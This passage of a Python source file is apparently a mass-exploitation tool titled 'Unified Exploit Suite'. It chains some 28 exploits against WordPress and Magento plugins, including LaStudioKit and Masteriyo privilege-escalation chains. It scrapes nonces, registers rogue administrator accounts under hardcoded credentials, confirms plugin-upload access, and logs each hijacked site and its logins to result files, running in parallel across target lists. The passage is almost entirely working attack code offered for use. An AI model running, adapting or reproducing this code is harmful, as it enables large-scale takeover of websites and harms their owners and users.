        markers = ['id="adminmenu"', 'id="wpadminbar"', 'dashboard', 'plugins.php', 'users.php']
        for ep in ["/wp-admin/", "/wp-admin/index.php", "/wp-admin/users.php"]:
            try:
                r = sess.get(f"{base}{ep}", timeout=timeout, verify=False, allow_redirects=False)
                if r.status_code == 200:
                    body = (r.text or "").lower()
                    if sum(1 for mk in markers if mk.lower() in body) >= 2:
                        return True
                elif r.status_code in (301, 302):
                    loc = r.headers.get("Location", "")
                    if "wp-login.php" in loc:
                        return False
            except Exception:
                continue
        return False

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            sess = build_session(timeout)
            email = _try_register(sess, base) or f"{RM_USERNAME}@example.com"
            prim_ok = False
            for role_key in ROLE_KEYS:
                s2 = build_session(timeout)
                if _exploit_primitive(s2, base, role_key):
                    prim_ok = True
                    break
            if not prim_ok:
                return False
            s3 = build_session(timeout)
            try:
                s3.get(f"{base}/wp-login.php", timeout=timeout, verify=False)
                ldata = {"log": RM_USERNAME, "pwd": RM_PASSWORD, "wp-submit": "Log In", "testcookie": "1"}
                lr = s3.post(f"{base}/wp-login.php", data=ldata, timeout=timeout, verify=False, allow_redirects=True)
                body = (lr.text or "").lower()
                fails = ["incorrect username", "invalid username", "invalid password", "is not registered"]
                if any(x in body for x in fails):
                    return False
                if not any(c.name.startswith("wordpress_logged_in") for c in s3.cookies):
                    return False
            except Exception:
                return False
            if _verify_admin(s3, base):
                stage_write(stage_name, "rm_admin_verify.txt",
                            f"{base} | USER:{RM_USERNAME} | PASS:{RM_PASSWORD} | EMAIL:{email}")
                safe_write_result("vulnurls.txt", base)
                safe_write_result("login.txt", f"{base} | {RM_USERNAME} | {RM_PASSWORD} | {email} | {base}/wp-login.php")
                return True
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 28: LASTUDIOKIT V2 (CVE-2026-0920)
# ============================================================================

def run_lastudiokit_v2(targets: List[str], threads: int, timeout: int) -> Dict:
    """CVE-2026-0920: extract ajaxNonce -> lakit_ajax register with lakit_bkrole -> verify full admin."""
    stage_name = "LaStudioKit-v2"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting LaStudioKit v2 full chain ({len(targets)} targets)")

    ADMIN_EMAIL = "adminSA12@exploit.com"
    ADMIN_PASSWORD = "adminSA"
    ADMIN_USERNAME = "Nx_admin"

    NONCE_PATHS = ["", "/", "/index.php", "/home", "/?page_id=1"]
    NONCE_PATTERNS = [
        r'"ajaxNonce"\s*:\s*"([a-zA-Z0-9_-]{5,})"',
        r"ajaxNonce['\"]?\s*:\s*['\"]([a-zA-Z0-9_-]{5,})['\"]",
        r"['\"]ajaxNonce['\"]\s*[:=]\s*['\"]([a-zA-Z0-9_-]{5,})['\"]",
        r'data-ajaxnonce=["\']([a-zA-Z0-9_-]{5,})["\']',
        r'data-ajax-nonce=["\']([a-zA-Z0-9_-]{5,})["\']',
    ]

    def _extract_nonce(base, sess):
        for path in NONCE_PATHS:
            try:
                r = sess.get(f"{base}{path}", timeout=timeout, verify=False)
                if r.status_code != 200:
                    continue
                for pat in NONCE_PATTERNS:
                    m = re.search(pat, r.text, re.I)
                    if m:
                        return m.group(1)
            except Exception:
                continue
        return None

    def _verify_admin(sess, base):
        login_url = f"{base}/wp-login.php"
        try:
            sess.get(login_url, timeout=timeout, verify=False)
            ldata = {"log": ADMIN_USERNAME, "pwd": ADMIN_PASSWORD,
                     "wp-submit": "Log In", "testcookie": "1",
                     "Cookie": "wordpress_test_cookie=WP Cookie check"}
            lr = sess.post(login_url, data=ldata, timeout=timeout, verify=False, allow_redirects=True)
            body = (lr.text or "").lower()
            fails = ["incorrect username", "invalid username", "invalid password", "is not registered"]
            if any(x in body for x in fails):
                return False
            if not any(c.name.startswith("wordpress_logged_in") for c in sess.cookies):
                return False
        except Exception:
            return False
        for u in [f"{base}/wp-admin/plugin-install.php",
                  f"{base}/wp-admin/plugin-install.php?tab=upload"]:
            try:
                rr = sess.get(u, timeout=timeout, verify=False, allow_redirects=False)
                if rr.status_code == 200:
                    txt = (rr.text or "").lower()
                    if any(x in txt for x in ["plugin-install-tab", "upload-plugin", "pluginzip"]):
                        return True
                elif rr.status_code in (301, 302):
                    if "wp-login.php" in rr.headers.get("Location", ""):
                        return False
            except Exception:
                continue
        return False

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            sess = build_session(timeout)
            nonce = _extract_nonce(base, sess)
            if not nonce:
                return False
            actions_payload = (
                '{"req1":{"action":"register","data":{'
                f'"email":"{ADMIN_EMAIL}",'
                f'"password":"{ADMIN_PASSWORD}",'
                f'"username":"{ADMIN_USERNAME}",'
                '"lakit_field_log":"yes","lakit_field_pwd":"yes",'
                '"lakit_field_cpwd":"no","lakit_bkrole":"1",'
                '"lakit_recaptcha_response":""}}}'
            )
            ajax_url = f"{base}/wp-admin/admin-ajax.php"
            data = {"action": "lakit_ajax", "_nonce": nonce, "actions": actions_payload}
            pr = sess.post(ajax_url, data=data, timeout=timeout, verify=False, allow_redirects=True)
            if pr.status_code != 200:
                return False
            low = pr.text.lower()
            success_markers = ['"success":true', "'success':true", '"created successfully"',
                               '"type":"success"', '"status":"success"']
            if not any(m in low for m in success_markers):
                return False
            s2 = build_session(timeout)
            if _verify_admin(s2, base):
                stage_write(stage_name, "lakit_v2_results.txt",
                            f"{base} | USER:{ADMIN_USERNAME} | PASS:{ADMIN_PASSWORD} | EMAIL:{ADMIN_EMAIL} | NONCE:{nonce}")
                safe_write_result("vulnurls.txt", base)
                safe_write_result("login.txt", f"{base} | {ADMIN_USERNAME} | {ADMIN_PASSWORD} | {ADMIN_EMAIL} | {base}/wp-login.php")
                return True
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# STAGE 29: MASTERIYO REST ESCALATION (CVE-2026-4484)
# ============================================================================

def run_masteriyo_rest(targets: List[str], threads: int, timeout: int) -> Dict:
    """CVE-2026-4484: register /account/signup/ -> masteriyo_login -> dashboard nonce -> REST escalate to admin."""
    stage_name = "Masteriyo-REST"
    results = {"stage": stage_name, "total": len(targets), "success": 0, "failed": 0}
    log_info(stage_name, f"Starting Masteriyo REST full chain ({len(targets)} targets)")

    USERNAME = resolve_credential("username_prefix", "Nxploited")
    PASSWORD = resolve_credential("password", "Nx_admin")

    def _get_signup_nonce(html):
        for pat in [r'name=["\']_wpnonce["\'][^>]*value=["\']([^"\']+)["\']',
                    r'["\']_wpnonce["\']\s*[:=]\s*["\']([^"\']+)["\']',
                    r'["\']nonce["\']\s*[:=]\s*["\']([^"\']+)["\']']:
            m = re.search(pat, html, re.I)
            if m:
                return m.group(1)
        return None

    def _register(sess, base, username, email, password):
        signup_url = f"{base}/account/signup/"
        try:
            rg = sess.get(signup_url, timeout=timeout, verify=False, allow_redirects=True)
            if rg.status_code != 200:
                return False
            nonce = _get_signup_nonce(rg.text)
            local_part = email.split("@")[0]
            data = {
                "remember": "true",
                "first-name": local_part,
                "last-name": "user",
                "username": username,
                "email": email,
                "password": password,
                "confirm-password": password,
                "masteriyo-registration": "yes",
            }
            if nonce:
                data["_wpnonce"] = nonce
            sess.post(f"{base}/st/", data=data, timeout=timeout, verify=False, allow_redirects=True)
            return True
        except Exception:
            return False

    def _login(sess, base, login_name, password):
        account_url = f"{base}/account/"
        ajax_url = f"{base}/wp-admin/admin-ajax.php"
        try:
            rg = sess.get(account_url, timeout=timeout, verify=False, allow_redirects=True)
            if rg.status_code != 200:
                return False
            nonce = _get_signup_nonce(rg.text)
            if not nonce:
                return False
            data = {
                "action": "masteriyo_login",
                "_wpnonce": nonce,
                "_wp_http_referer": "/account/",
                "username": login_name,
                "password": password,
                "redirect_to": account_url,
            }
            sess.post(ajax_url, data=data, timeout=timeout, verify=False)
            return any(c.name.startswith("wordpress_logged_in") for c in sess.cookies)
        except Exception:
            return False

    def _get_dashboard_ctx(sess, base):
        dash_url = f"{base}/account/#/dashboard"
        try:
            r = sess.get(dash_url, timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code != 200:
                return None, None
            uid = re.search(r'"current_user_id"\s*:\s*"(\d+)"', r.text, re.I)
            nc = re.search(r'"nonce"\s*:\s*"([A-Za-z0-9]{4,64})"', r.text, re.I)
            return (uid.group(1) if uid else None), (nc.group(1) if nc else None)
        except Exception:
            return None, None

    def _escalate(sess, base, user_id, nonce):
        url = f"{base}/wp-json/masteriyo/v1/users/instructors/{user_id}"
        headers = {"Content-Type": "application/json", "X-WP-Nonce": nonce}
        try:
            r = sess.post(url, headers=headers, data=json.dumps({"roles": ["administrator"]}),
                          timeout=timeout, verify=False)
            body = r.text or ""
            try:
                j = r.json()
                return "administrator" in (j.get("roles") or [])
            except Exception:
                return '"roles":["administrator"' in body
        except Exception:
            return False

    def _verify_admin(sess, base):
        for u in [f"{base}/wp-admin/index.php", f"{base}/wp-admin/plugin-install.php"]:
            try:
                r = sess.get(u, timeout=timeout, verify=False, allow_redirects=False)
                if r.status_code == 200:
                    body = (r.text or "").lower()
                    if any(x in body for x in ["dashboard", "adminmenu", "plugin-install-tab", "upload-plugin"]):
                        return True
                elif r.status_code in (301, 302):
                    if "wp-login.php" in r.headers.get("Location", ""):
                        return False
            except Exception:
                continue
        return False

    def exploit_target(target: str) -> bool:
        try:
            base = normalize_url(target)
            if not base:
                return False
            email = f"{USERNAME}_{random.randint(1000, 9999)}@example.com"
            sess = build_session(timeout)
            _register(sess, base, USERNAME, email, PASSWORD)
            if not _login(sess, base, email, PASSWORD):
                return False
            user_id, nonce = _get_dashboard_ctx(sess, base)
            if not user_id or not nonce:
                return False
            if not _escalate(sess, base, user_id, nonce):
                return False
            s2 = build_session(timeout)
            if not _login(s2, base, email, PASSWORD):
                return False
            if _verify_admin(s2, base):
                stage_write(stage_name, "masteriyo_rest_results.txt",
                            f"{base} | USER:{email} | PASS:{PASSWORD} | user_id:{user_id}")
                safe_write_result("vulnurls.txt", base)
                safe_write_result("login.txt", f"{base} | {email} | {PASSWORD} | {email} | {base}/wp-login.php")
                return True
            return False
        except Exception:
            return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(exploit_target, t): t for t in targets}
        for future in as_completed(futures):
            try:
                if future.result(): results["success"] += 1
                else: results["failed"] += 1
            except Exception:
                results["failed"] += 1

    log_ok(stage_name, f"Completed: {results['success']} success, {results['failed']} failed")
    return results


# ============================================================================
# MAIN ORCHESTRATION
# ============================================================================

def prompt_user_config() -> None:
    """Prompt user once for unified config."""
    print("\n" + "=" * 80)
    print("  EXPLOIT SUITE - UNIFIED CONFIGURATION")
    print("=" * 80 + "\n")
    
    # Target file
    target_input = input(f"Target file [list.txt]: ").strip() or "list.txt"
    GLOBAL_CONFIG["targets_file"] = target_input
    
    # Threads
    try:
        threads_input = int(input(f"Threads [10]: ").strip() or "10")
        GLOBAL_CONFIG["threads"] = max(1, min(threads_input, 100))
    except ValueError:
        GLOBAL_CONFIG["threads"] = 10
    
    # Timeout
    try:
        timeout_input = int(input(f"Timeout in seconds [30]: ").strip() or "30")
        GLOBAL_CONFIG["timeout"] = max(5, timeout_input)
    except ValueError:
        GLOBAL_CONFIG["timeout"] = 30
    
    print("\n" + "=" * 80)
    print(f"  Configuration confirmed:")
    print(f"    Targets File: {GLOBAL_CONFIG['targets_file']}")
    print(f"    Threads:      {GLOBAL_CONFIG['threads']}")
    print(f"    Timeout:      {GLOBAL_CONFIG['timeout']} seconds")
    print("=" * 80 + "\n")


def execute_all_stages() -> List[Dict]:
    """Execute stages per-target with parallel target workers: each target tries stages sequentially until hit."""
    stages = [
        ("YayMail",           run_yaymail),
        ("VC Tabs",           run_vc_tabs),
        ("CVE-2025-6389",     run_cve_2025_6389),
        ("WWLC",              run_wwlc),
        ("Post-SMTP",         run_post_smtp),
        ("WooCPay",           run_woocpay),
        ("Masteriyo",         run_masteriyo),
        ("Magento",           run_magento),
        ("Nxzero",            run_nxzero),
        ("N_X",               run_nx),
        ("ACF Form",          run_acf_form),
        ("WP Email Reg",      run_wp_email_register),
        ("WP Reset",          run_wp_reset),
        ("Academy LMS",       run_academy_lms),
        ("User Reg",          run_user_registration),
        ("WK WooCom",         run_wk_woocommerce),
        ("Masteriyo Elegant", run_masteriyo_elegant),
        ("Eventin CSV",       run_eventin_csv),
        ("QC-OPD",            run_qc_opd),
        ("SBD Login",         run_sbd_login),
        ("WC Designer Pro",   run_wc_designer_pro),
        ("LaStudioKit",       run_lastudiokit),
        ("BePlus Import",     run_beplus_import),
        ("CVE-2025-13390",    run_cve_2025_13390),
        ("WP Reset Auto",     run_wp_reset_auto_upload),
        ("ACF-FrontendForm",  run_acf_frontend_form),
        ("RegistrationMagic", run_registrationmagic),
        ("LaStudioKit-v2",    run_lastudiokit_v2),
        ("Masteriyo-REST",    run_masteriyo_rest),
    ]

    targets = GLOBAL_CONFIG["targets"]
    workers = GLOBAL_CONFIG["threads"]
    timeout = GLOBAL_CONFIG["timeout"]

    stage_stats: Dict[str, Dict[str, int]] = {}
    for name, _ in stages:
        stage_stats[name] = {"success": 0, "failed": 0, "total": 0}
    stats_lock = threading.Lock()

    log_info("MAIN", f"Parallel mode: {len(targets)} targets, {workers} workers, {len(stages)} stages")
    log_info("MAIN", f"{'='*80}")

    completed = 0
    total_targets = len(targets)

    def process_target(target: str) -> None:
        nonlocal completed
        base = normalize_url(target)
        try:
            requests.head(base, timeout=5, verify=False)
        except Exception:
            with stats_lock:
                nonlocal completed
                completed += 1
            log_err("CHAIN", f"[{completed}/{total_targets}] {base} -> DEAD — skipped")
            return

        for stage_label, stage_func in stages:
            result = stage_func([base], 1, timeout)
            with stats_lock:
                stage_stats[stage_label]["total"] += 1
                stage_stats[stage_label]["success"] += result["success"]
                stage_stats[stage_label]["failed"] += result["failed"]
            if result["success"] > 0:
                with stats_lock:
                    completed += 1
                log_ok("CHAIN", f"[{completed}/{total_targets}] {base} -> {stage_label}: HIT")
                return

        with stats_lock:
            completed += 1
        log_err("CHAIN", f"[{completed}/{total_targets}] {base} -> all {len(stages)} missed")

    with ThreadPoolExecutor(max_workers=workers) as executor:
        list(executor.map(process_target, targets))

    all_results = []
    for stage_label, _ in stages:
        stats = stage_stats[stage_label]
        all_results.append({
            "stage": stage_label,
            "total": stats["total"],
            "success": stats["success"],
            "failed": stats["failed"],
        })

    return all_results


def print_summary(all_results: List[Dict]) -> None:
    """Print execution summary."""
    print("\n" + "=" * 80)
    print("  FINAL EXECUTION SUMMARY")
    print("=" * 80 + "\n")
    
    total_targets = 0
    total_success = 0
    total_failed = 0
    
    print(f"{'Stage':<20} {'Total':<8} {'Success':<10} {'Failed':<10} {'Rate':<10}")
    print("-" * 80)
    
    for result in all_results:
        stage = result.get("stage", "Unknown")
        total = result.get("total", 0)
        success = result.get("success", 0)
        failed = result.get("failed", 0)
        
        total_targets += total
        total_success += success
        total_failed += failed
        
        rate = f"{(success/total*100):.1f}%" if total > 0 else "0%"
        print(f"{stage:<20} {total:<8} {success:<10} {failed:<10} {rate:<10}")
    
    print("-" * 80)
    grand_rate = f"{(total_success/total_targets*100):.1f}%" if total_targets > 0 else "0%"
    print(f"{'TOTAL':<20} {total_targets:<8} {total_success:<10} {total_failed:<10} {grand_rate:<10}")
    print("=" * 80 + "\n")


def main() -> int:
    """Main entry point."""
    print("\n")
    print("╔" + "=" * 78 + "╗")
    print("║" + "  UNIFIED EXPLOIT SUITE - 27 SCRIPTS CONSOLIDATED".center(78) + "║")
    print("║" + "  28 Stages • Per-Target Chain Execution • Stop-on-first-hit".center(78) + "║")
    print("╚" + "=" * 78 + "╝")
    print()
    
    # Prompt for config (once)
    prompt_user_config()
    
    # Load targets
    log_info("INIT", f"Loading targets from {GLOBAL_CONFIG['targets_file']}...")
    targets = load_targets(GLOBAL_CONFIG["targets_file"])
    
    if not targets:
        log_err("INIT", f"No targets loaded from {GLOBAL_CONFIG['targets_file']}")
        return 1
    
    GLOBAL_CONFIG["targets"] = targets
    log_ok("INIT", f"Loaded {len(targets)} targets")
    
    # Execute per-target chain
    log_info("INIT", "Beginning per-target chain execution...\n")
    all_results = execute_all_stages()
    
    # Print summary
    print_summary(all_results)
    
    # List result files
    print("Result files by stage:")
    for entry in sorted(os.listdir(RESULTS_DIR)):
        stage_path = os.path.join(RESULTS_DIR, entry)
        if os.path.isdir(stage_path):
            files = [f for f in os.listdir(stage_path) if f.endswith('.txt')]
            if files:
                print(f"  results/{entry}/")
                for f in sorted(files):
                    fpath = os.path.join(stage_path, f)
                    size = os.path.getsize(fpath)
                    print(f"    {f} ({size}B)")
    
    print("\n✓ Exploit suite execution completed")
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n\n[!] Execution interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
